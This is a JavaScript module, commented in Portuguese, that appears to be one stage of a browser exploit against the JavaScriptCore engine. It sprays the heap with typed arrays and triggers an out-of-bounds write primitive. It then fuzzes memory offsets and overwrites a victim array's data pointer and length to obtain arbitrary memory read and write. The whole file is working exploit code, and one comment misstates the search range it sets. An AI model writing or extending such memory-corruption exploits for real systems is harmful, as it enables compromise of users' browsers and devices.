// js/script3/testArrayBufferVictimCrash.mjs (ATUALIZADO para R47.1 - Fuzzer com Busca Ampliada)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    oob_write_absolute,
    getOOBDataView
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

// Mantemos o mesmo nome do módulo, pois é apenas um ajuste no fuzzer
export const FNAME_MODULE_STABLE_FUZZER_R47 = "Heisenbug_StableOffsetFuzzer_R47";

function sync_oob_read_32(dataview, offset) {
    if (!dataview) return 0;
    return dataview.getUint32(offset, true);
}

export async function executeStableOffsetFuzzer_R47() {
    const FNAME_CURRENT_TEST = FNAME_MODULE_STABLE_FUZZER_R47;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Buscando Offset com Fuzzer Estável (Busca Ampliada) ---`, "test", FNAME_CURRENT_TEST);
    
    let result = { success: false, msg: "Fuzzer não encontrou um offset válido.", errorOccurred: null };
    let victim_array = null;

    try {
        logS3(`--- Fase 0 (R47.1): Preparação do Heap e Ambiente OOB ---`, "subtest", FNAME_CURRENT_TEST);
        let spray = [];
        for (let i = 0; i < 1000; i++) {
            spray.push(new Uint32Array(32));
        }
        victim_array = new Uint32Array(32);
        spray = null;
        logS3(`[R47.1] Heap preparado. Array vítima criado.`, 'info');
        
        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST}-Setup` });
        const oob_dataview = getOOBDataView();
        if (!oob_dataview) {
            throw new Error("Não foi possível obter o DataView da primitiva OOB.");
        }
        logS3(`[R47.1] Ambiente OOB configurado UMA VEZ.`, 'info');
        
        logS3(`--- Fase 1 (R47.1): Iniciando Loop de Fuzzing Estável ---`, "subtest", FNAME_CURRENT_TEST);

        const M_VECTOR_OFFSET = JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
        const M_LENGTH_OFFSET = JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
        const FUZZ_START_OFFSET = 0x20;
        // ======================= A MUDANÇA CRÍTICA ESTÁ AQUI =======================
        const FUZZ_END_OFFSET = 0x80000; // AUMENTADO de 0x800 para 0x4000 (16 KB)
        // =========================================================================
        const FUZZ_STEP = 0x4;

        for (let offset_guess = FUZZ_START_OFFSET; offset_guess < FUZZ_END_OFFSET; offset_guess += FUZZ_STEP) {
            
            // NOVO: Log de progresso para sabermos que o fuzzer está rodando
            if (offset_guess % 0x100 === 0) {
                logS3(`[Fuzzer] Progresso: Testando faixa a partir de ${toHex(offset_guess)}...`, 'debug');
            }

            const vector_write_target = offset_guess + M_VECTOR_OFFSET;
            const length_write_target = offset_guess + M_LENGTH_OFFSET;

            const original_vector_low = sync_oob_read_32(oob_dataview, vector_write_target);
            const original_vector_high = sync_oob_read_32(oob_dataview, vector_write_target + 4);
            const original_length = sync_oob_read_32(oob_dataview, length_write_target);
            
            oob_write_absolute(vector_write_target, 0x0, 4);
            oob_write_absolute(vector_write_target + 4, 0x0, 4);
            oob_write_absolute(length_write_target, 0x7FFFFFFF, 4);

            let read_back_value = -1;
            const TEST_ADDRESS = 0x100000;
            const TEST_VALUE = 0xDEADBEEF;
            const test_index = TEST_ADDRESS / 4;

            try {
                victim_array[test_index] = TEST_VALUE;
                read_back_value = victim_array[test_index];
            } catch (e) { /* Ignora erros */ }
            
            oob_write_absolute(vector_write_target, original_vector_low, 4);
            oob_write_absolute(vector_write_target + 4, original_vector_high, 4);
            oob_write_absolute(length_write_target, original_length, 4);
            
            if (read_back_value === TEST_VALUE) {
                result.success = true;
                result.msg = `Offset funcional encontrado: ${toHex(offset_guess)}`;
                logS3(`[Fuzzer] SUCESSO! ${result.msg}`, 'vuln');
                break; 
            }
        }

        if (!result.success) {
             throw new Error(`Fuzzer completou a faixa de ${toHex(FUZZ_START_OFFSET)} a ${toHex(FUZZ_END_OFFSET)} sem encontrar um offset válido.`);
        }

    } catch (e_outer) {
        result.errorOccurred = e_outer;
        result.msg = e_outer.message;
        logS3(`  CRITICAL ERROR (R47.1): ${e_outer.message || String(e_outer)}`, "critical", FNAME_CURRENT_TEST);
        console.error("Outer error in R47.1 Fuzzer:", e_outer);
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST}-FinalClear` });
    }

    logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
    return result;
}
